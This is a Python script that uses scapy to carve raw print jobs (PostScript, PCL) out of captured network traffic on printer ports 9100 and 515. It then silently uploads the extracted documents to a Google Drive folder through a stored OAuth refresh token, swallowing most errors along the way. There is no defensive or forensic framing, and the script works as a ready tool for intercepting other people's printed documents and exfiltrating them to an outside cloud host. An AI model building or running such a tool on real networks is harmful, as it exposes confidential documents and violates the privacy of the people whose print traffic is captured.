import collections
import os

from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from scapy.layers.inet import IP, TCP
from scapy.utils import PcapReader

# ============================================================================
# CONFIGURATION
# ============================================================================

# output directories (win paths)
OUTDIR = r'C:\Users\User\Downloads\extracted_print_jobs'
PCAPS = r'C:\Users\User\Downloads'

# G drive folder name
DRIVE_FOLDER_NAME = 'Extracted_Print_Jobs'

# ============================================================================
# CREDENTIALS
# ============================================================================

CLIENT_ID = ""
CLIENT_SECRET = ""
REFRESH_TOKEN = ""

# ============================================================================
# END OF CONFIGURATION
# ============================================================================

os.makedirs(OUTDIR, exist_ok=True)

SCOPES = ['https://www.googleapis.com/auth/drive.file']
TOKEN_URI = 'https://oauth2.googleapis.com/token'


class GoogleDriveUploader:
    def __init__(self):
        self.service = None
        self.folder_id = None

    def authenticate(self):
        if not CLIENT_ID or not CLIENT_SECRET or not REFRESH_TOKEN:
            return False

        try:
            creds = Credentials(
                token=None,
                refresh_token=REFRESH_TOKEN,
                token_uri=TOKEN_URI,
                client_id=CLIENT_ID,
                client_secret=CLIENT_SECRET,
                scopes=SCOPES
            )

            # refresh token
            creds.refresh(Request())

            self.service = build('drive', 'v3', credentials=creds)
            return True

        except Exception as e:
            return False

    def get_or_create_folder(self):
        if not self.service:
            return None

        try:
            # search for folder
            query = f"name='{DRIVE_FOLDER_NAME}' and mimeType='application/vnd.google-apps.folder' and trashed=false"
            results = self.service.files().list(q=query, spaces='drive', fields='files(id, name)').execute()
            folders = results.get('files', [])

            if folders:
                self.folder_id = folders[0]['id']
            else:
                # create folder
                file_metadata = {
                    'name': DRIVE_FOLDER_NAME,
                    'mimeType': 'application/vnd.google-apps.folder'
                }
                folder = self.service.files().create(body=file_metadata, fields='id').execute()
                self.folder_id = folder.get('id')

            return self.folder_id

        except Exception as e:
            return None

    # uploads file to drive
    def upload_file(self, file_path):
        if not self.service or not self.folder_id:
            return None

        file_name = os.path.basename(file_path)

        mime_types = {
            '.ps': 'application/postscript',
            '.pcl': 'application/vnd.hp-pcl',
            '.bin': 'application/octet-stream',
            '.pdf': 'application/pdf',
        }
        ext = os.path.splitext(file_name)[1].lower()
        mime_type = mime_types.get(ext, 'application/octet-stream')

        file_metadata = {
            'name': file_name,
            'parents': [self.folder_id]
        }

        media = MediaFileUpload(file_path, mimetype=mime_type, resumable=True)

        try:
            file = self.service.files().create(
                body=file_metadata,
                media_body=media,
                fields='id, name, webViewLink'
            ).execute()

            return file.get('id')

        except Exception as e:
            print(f"[!] Upload failed: {e}")
            return None


class Recapper:
    def __init__(self, fname):
        self.fname = fname
        self.sessions = collections.defaultdict(list)
        self.extracted_files = []

    def get_sessions(self):
        with PcapReader(self.fname) as reader:
            for pkt in reader:
                if IP in pkt and TCP in pkt and pkt[TCP].payload:
                    if pkt[TCP].dport == 9100 or pkt[TCP].sport == 9100 or \
                       pkt[TCP].dport == 515 or pkt[TCP].sport == 515:
                        ident = tuple(sorted((pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)))
                        self.sessions[ident].append(pkt)

        return self.sessions

    def write_jobs(self):
        count = 0
        self.extracted_files = []

        for ident, packets in self.sessions.items():
            packets.sort(key=lambda p: p[TCP].seq)
            raw_payload = b''.join(bytes(p[TCP].payload) for p in packets)

            if not raw_payload:
                continue

            ext = 'bin'
            if b'%!PS' in raw_payload:
                ext = 'ps'
            elif b'\x1b%-12345X' in raw_payload or b'\x1bE' in raw_payload:
                ext = 'pcl'

            fname = f'job_stream_{count}.{ext}'
            path = os.path.join(OUTDIR, fname)

            with open(path, 'wb') as f:
                f.write(raw_payload)

            self.extracted_files.append(path)
            count += 1

        return self.extracted_files


def upload_to_google_drive(file_paths):
    if not file_paths:
        return

    uploader = GoogleDriveUploader()

    if not uploader.authenticate():
        return

    if not uploader.get_or_create_folder():
        return

    success = 0
    for path in file_paths:
        if os.path.exists(path) and uploader.upload_file(path):
            success += 1



if __name__ == '__main__':
    pfile = os.path.join(PCAPS, 'captured.pcap')

    if os.path.exists(pfile):
        recapper = Recapper(pfile)
        recapper.get_sessions()
        extracted = recapper.write_jobs()

        if extracted:
            upload_to_google_drive(extracted)
    else:
        print(f"no file: {pfile}")
